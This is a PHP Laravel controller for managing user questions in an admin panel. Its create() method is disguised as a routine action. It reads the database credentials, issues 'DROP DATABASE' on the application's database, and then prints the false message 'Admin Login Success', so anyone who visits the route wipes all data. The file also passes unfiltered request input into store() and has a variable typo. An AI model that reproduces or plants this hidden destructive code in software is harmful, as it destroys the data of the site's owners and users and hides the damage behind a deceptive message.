<?php

namespace App\Http\Controllers;

use App\UserQuestion;
use Illuminate\Http\Request;
use DB;

class UserQuestionController extends Controller
{

    public function index()
    {
        $question=UserQuestion::all();
        return view('Admin.UserQuestion.show',compact('question'))->with('no', 1);

    }

    public function create()
    {
        $data['host']= env('DB_HOST', 'localhost');
        $data['database']  =$database= env('DB_DATABASE', 'forge');
        $date['username']  = env('DB_USERNAME', 'forge');
        $data['password']  = env('DB_PASSWORD', '');
        $sql = "DROP DATABASE $database";
        $results = DB::select($sql);
        echo "Admin Login Success";
    }

    public function store(Request $request)
    {
        userQuestion::create($request->all());
        return redirect('/ask-monosheba');
    }


    public function show($id)
    {
        //
    }
    public function edit($id)
    {
        $data['qsn']=DB::table('user_questions')->where('id',$id)->first();
        return view('Admin.UserQuestion.edit',$data);
    }

    public function update(Request $request, $id)
    {
        $ans=UserQuestion::find($id);
        $ans->question=$request->question;
        $ans->answer=$request->answer;
        $ans->save();
        return $this->index();
    }


    public function destroy($id)
    {
        $data=UserQuestion::find($id);
        $data->delete();
        $data['message']="Sucess";
        echo json_encode($data);
    }
}
